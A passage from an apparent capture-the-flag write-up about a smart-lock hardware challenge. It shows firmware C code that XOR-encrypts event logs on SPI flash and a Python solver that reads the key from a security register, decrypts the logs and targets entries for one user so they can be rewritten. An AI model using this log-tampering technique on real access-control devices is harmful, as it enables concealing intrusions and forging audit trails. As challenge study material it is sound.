</span></span><span class="line"><span class="cl">    <span class="c1">// Print the serialized buffer (including CRC) for debugging
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Serialized Buffer (including CRC):&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">i</span> <span class="o">%</span> <span class="mi">16</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span> <span class="c1">// New line for readability every 16 bytes
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%02X &#34;</span><span class="p">,</span> <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Write the buffer to flash
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">write_to_flash</span><span class="p">(</span><span class="n">sector</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Read 256 byte data from Address=0
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">256</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">n</span> <span class="o">=</span>  <span class="nf">W25Q128_read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">256</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Read Data: n=%d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">dump</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="mi">256</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// encrypts log events 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">void</span> <span class="nf">encrypt_data</span><span class="p">(</span><span class="kt">uint8_t</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">data_length</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="n">register_number</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">address</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint8_t</span> <span class="n">key</span><span class="p">[</span><span class="n">KEY_SIZE</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">read_security_register</span><span class="p">(</span><span class="n">register_number</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="n">key</span><span class="p">);</span> <span class="c1">// register, address
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Data before encryption (including CRC):</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">data_length</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%02X &#34;</span><span class="p">,</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Print the CRC32 checksum before encryption (assuming the original data includes CRC)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">uint32_t</span> <span class="n">crc_before_encryption</span> <span class="o">=</span> <span class="nf">calculateCRC32</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">data_length</span> <span class="o">-</span> <span class="n">CRC_SIZE</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;CRC32 before encryption: 0x%08X</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">crc_before_encryption</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Apply encryption to data, excluding CRC, using the key
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">data_length</span> <span class="o">-</span> <span class="n">CRC_SIZE</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// Exclude CRC data from encryption
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="n">KEY_SIZE</span><span class="p">];</span> <span class="c1">// Cycle through  key bytes
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Data after encryption (including CRC):</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">data_length</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%02X &#34;</span><span class="p">,</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">write_to_flash</span><span class="p">(</span><span class="kt">uint32_t</span> <span class="n">sector</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">address</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">length</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Writing to flash at sector %u, address %u</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">sector</span><span class="p">,</span> <span class="n">address</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="kt">uint8_t</span> <span class="n">i</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint16_t</span> <span class="n">n</span><span class="p">;</span>  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">encrypt_data</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">address</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">n</span> <span class="o">=</span>  <span class="nf">W25Q128_pageWrite</span><span class="p">(</span><span class="n">sector</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="mi">16</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;page_write(0,10,d,26): n=%d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Reading the <code>log_event.c</code> gave us insight into how it works:</p>
<ul>
<li>This C code is used to log the <code>SmartLockEvent</code>.</li>
<li>The log is written starting from the address <code>0</code> of the flash memory.</li>
<li>Each log consist of <code>16</code> bytes, where:
<ul>
<li><code>12</code> bytes is the encrypted data of <code>SmartLockEvent</code>.
<ul>
<li>The encryption is very simple:
<ul>
<li>Take the <code>key</code> from the <code>security_register</code> number <code>1</code> with address <code>0x52</code>.</li>
<li>Xor the <code>data</code> with the <code>key</code>.</li>
</ul>
</li>
</ul>
</li>
<li><code>4</code> bytes is the CRC32 of the original data of <code>SmartLockEvent</code>.</li>
</ul>
</li>
</ul>
<p>Our goal was to modify certain <code>SmartLockEvent</code> logs, specifically those with <code>user_id = 0x5244</code>, to point to a different user.</p>
<h3 id="solution-4">Solution</h3>
<p>I revisited the flash memory documentation, using the same <a href="https://www.pjrc.com/teensy/W25Q128FV.pdf" target="_blank" rel="noopener noreffer ">resource</a> as before. To simplify the process, I extended <code>client.py</code> with an <code>EventLog</code> class for easier log parsing.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># SOLVER</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">p32</span><span class="p">,</span> <span class="n">u32</span><span class="p">,</span> <span class="n">p16</span><span class="p">,</span> <span class="n">u16</span><span class="p">,</span> <span class="n">p8</span><span class="p">,</span> <span class="n">u8</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">zlib</span> <span class="kn">import</span> <span class="n">crc32</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">datetime</span> <span class="kn">import</span> <span class="n">datetime</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">EventLog</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">timestamp</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="n">event_type</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="n">user_id</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="n">method</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="n">status</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">timestamp</span><span class="p">,</span> <span class="n">event_type</span><span class="p">,</span> <span class="n">user_id</span><span class="p">,</span> <span class="n">method</span><span class="p">,</span> <span class="n">status</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">timestamp</span> <span class="o">=</span> <span class="n">timestamp</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">event_type</span> <span class="o">=</span> <span class="n">event_type</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">user_id</span> <span class="o">=</span> <span class="n">user_id</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">method</span> <span class="o">=</span> <span class="n">method</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">status</span> <span class="o">=</span> <span class="n">status</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">out</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">        timestamp : </span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">timestamp</span><span class="si">}</span><span class="s1"> (</span><span class="si">{</span><span class="n">datetime</span><span class="o">.</span><span class="n">fromtimestamp</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">timestamp</span><span class="p">)</span><span class="si">}</span><span class="s1">)
</span></span></span><span class="line"><span class="cl"><span class="s1">        event_type: </span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">event_type</span><span class="si">}</span><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">        user_id   : </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">user_id</span><span class="p">)</span><span class="si">}</span><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">        method    : </span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">method</span><span class="si">}</span><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">        status    : </span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">status</span><span class="si">}</span><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">        &#39;&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">serialize</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">p32</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">timestamp</span><span class="p">)</span> <span class="o">+</span> <span class="n">p16</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">event_type</span><span class="p">)</span> <span class="o">+</span> <span class="n">p16</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">user_id</span><span class="p">)</span> <span class="o">+</span> <span class="n">p8</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">method</span><span class="p">)</span> <span class="o">+</span> <span class="n">p8</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">status</span><span class="p">)</span> <span class="o">+</span> <span class="n">p16</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Reading through the documentaion, I identified a useful command, <code>Read Security Registers</code> (Section 8.2.33, instruction code <code>0x48</code>), which can be used to obtain the <strong>encryption key</strong>. Heres a snippet for fetching the key:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">CMD_READ_SEC_REG</span> <span class="o">=</span> <span class="mh">0x48</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Do read_security_register(1, 0x52, KEY_SIZE)</span>
</span></span><span class="line"><span class="cl"><span class="n">key</span> <span class="o">=</span> <span class="n">exchange</span><span class="p">([</span><span class="n">CMD_READ_SEC_REG</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x01</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">],</span> <span class="mi">12</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;key = </span><span class="si">{</span><span class="nb">bytes</span><span class="p">(</span><span class="n">key</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Armed with the <strong>key</strong>, decrypting the event logs was straightforward. The script below was used to parse the event logs stored in the flash memory:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">CMD_READ</span> <span class="o">=</span> <span class="mh">0x3</span>
</span></span><span class="line"><span class="cl"><span class="n">KEY_SIZE</span> <span class="o">=</span> <span class="mi">12</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Helper</span>
</span></span><span class="line"><span class="cl"><span class="c1"># read_data format: addr is array of 3 bytes, size is int</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">read_data</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">exchange</span><span class="p">([</span><span class="n">CMD_READ</span><span class="p">]</span><span class="o">+</span><span class="n">addr</span><span class="p">,</span> <span class="n">size</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Define decrypt and encrypt functions</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">dec_data</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">        <span class="n">dec_data</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">^</span><span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="o">%</span><span class="n">KEY_SIZE</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">dec_data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">enc_data</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">        <span class="n">enc_data</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">^</span><span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="o">%</span><span class="n">KEY_SIZE</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">enc_data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Convert raw_event_log to EventLog class</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">parse_log</span><span class="p">(</span><span class="n">event_log</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">timestamp</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">event_log</span><span class="p">[:</span><span class="mi">4</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="n">event_type</span> <span class="o">=</span> <span class="n">u16</span><span class="p">(</span><span class="n">event_log</span><span class="p">[</span><span class="mi">4</span><span class="p">:</span><span class="mi">6</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="n">user_id</span> <span class="o">=</span> <span class="n">u16</span><span class="p">(</span><span class="n">event_log</span><span class="p">[</span><span class="mi">6</span><span class="p">:</span><span class="mi">8</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="n">method</span> <span class="o">=</span> <span class="n">u8</span><span class="p">(</span><span class="n">event_log</span><span class="p">[</span><span class="mi">8</span><span class="p">:</span><span class="mi">9</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="n">status</span> <span class="o">=</span> <span class="n">u8</span><span class="p">(</span><span class="n">event_log</span><span class="p">[</span><span class="mi">9</span><span class="p">:</span><span class="mi">10</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">EventLog</span><span class="p">(</span><span class="n">timestamp</span><span class="p">,</span> <span class="n">event_type</span><span class="p">,</span> <span class="n">user_id</span><span class="p">,</span> <span class="n">method</span><span class="p">,</span> <span class="n">status</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Read event_log from spiflash</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">read_event_log</span><span class="p">(</span><span class="n">address</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">addr</span> <span class="o">=</span> <span class="p">[</span><span class="n">b</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">p32</span><span class="p">(</span><span class="n">address</span><span class="p">)[::</span><span class="o">-</span><span class="mi">1</span><span class="p">][</span><span class="mi">1</span><span class="p">:]]</span> <span class="c1"># 24 byte</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># CMD_READ(addr, len)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># sizeof(SmartLockEvent) is 0xc (not 0x9 because of compiler struct padding)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># sizeof(crc32) is 0x4</span>
</span></span><span class="line"><span class="cl">    <span class="n">out</span> <span class="o">=</span> <span class="n">read_data</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="mh">0xc</span><span class="o">+</span><span class="mh">0x4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">enc_log</span> <span class="o">=</span> <span class="n">out</span><span class="p">[:</span><span class="mh">0xc</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">crc32_log</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">out</span><span class="p">[</span><span class="mh">0xc</span><span class="p">:])</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">enc_log</span> <span class="o">==</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xff</span><span class="s1">&#39;</span><span class="o">*</span><span class="mh">0xc</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># Invalid log (data in the specified address is clean)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Decrypt encrypted event_log with the key that we retrieved</span>
</span></span><span class="line"><span class="cl">    <span class="n">raw_log</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">enc_log</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">assert</span> <span class="n">crc32</span><span class="p">(</span><span class="n">raw_log</span><span class="p">)</span> <span class="o">==</span> <span class="n">crc32_log</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Parse log to help our life easier</span>
</span></span><span class="line"><span class="cl">    <span class="n">event_log</span> <span class="o">=</span>  <span class="n">parse_log</span><span class="p">(</span><span class="n">raw_log</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">event_log</span><span class="p">,</span> <span class="n">crc32_log</span><span class="p">,</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">event_logs</span> <span class="o">=</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl"><span class="c1"># There are 160 logs based on testing manually </span>
</span></span><span class="line"><span class="cl"><span class="c1"># (also the event log for user_id 0x5244 start from idx 156)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Search for user_id 0x5244 event_logs&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">160</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;----&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;log-</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s1">...&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">event_log</span><span class="p">,</span> <span class="n">crc32_log</span><span class="p">,</span> <span class="n">is_valid</span> <span class="o">=</span> <span class="n">read_event_log</span><span class="p">(</span><span class="n">i</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">is_valid</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="cl">    <span class="n">event_log</span><span class="o">.</span><span class="n">out</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">event_log</span><span class="o">.</span><span class="n">user_id</span> <span class="o">==</span> <span class="mh">0x5244</span><span class="p">:</span>
